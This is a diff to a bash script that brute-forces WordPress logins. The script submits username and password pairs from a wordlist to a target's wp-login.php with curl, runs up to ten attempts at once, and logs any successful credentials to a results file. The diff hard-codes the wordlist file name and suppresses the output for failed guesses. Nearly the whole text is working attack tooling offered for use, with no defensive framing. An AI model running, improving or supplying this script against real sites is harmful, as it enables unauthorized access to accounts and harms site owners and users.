@@ -2,6 +2,7 @@
 
 curl_timeout=20
 multithread_limit=10
+password_list="pass.txt"
 
 if [[ -f wpusername.tmp ]]
 then
@@ -42,13 +43,11 @@ function _TestLogin() {
         LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
         if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
         then
-                echo -e "${CYN}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
+                : # Jangan tampilkan list password yang salah
         elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
         then
                 echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
                 echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
-        else
-                echo -e "${CYN}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
         fi
 }
 
@@ -76,12 +75,9 @@ then
         exit
 fi
 
-echo -ne "[?] Input password lists in (file) : \x1b[1;97m"
-read PasswordLists
-
-if [[ ! -f ${PasswordLists} ]]
+if [[ ! -f ${password_list} ]]
 then
-        echo -e "${RED}ERROR: Wordlists not found!${CLR}"
+        echo -e "${RED}ERROR: Wordlist file '${password_list}' not found!${CLR}"
         exit
 fi
 
@@ -92,7 +88,7 @@ then
         for User in $(cat wpusername.tmp)
         do
                 (
-                        for Pass in $(cat ${PasswordLists})
+                        for Pass in $(cat ${password_list})
                         do
                                 ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
                                 _TestLogin ${Target} ${User} ${Pass} &
@@ -112,7 +108,7 @@ else
         fi
         echo ''
         (
-                for Pass in $(cat ${PasswordLists})
+                for Pass in $(cat ${password_list})
                 do
                         ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
                         _TestLogin ${Target} ${User} ${Pass} &
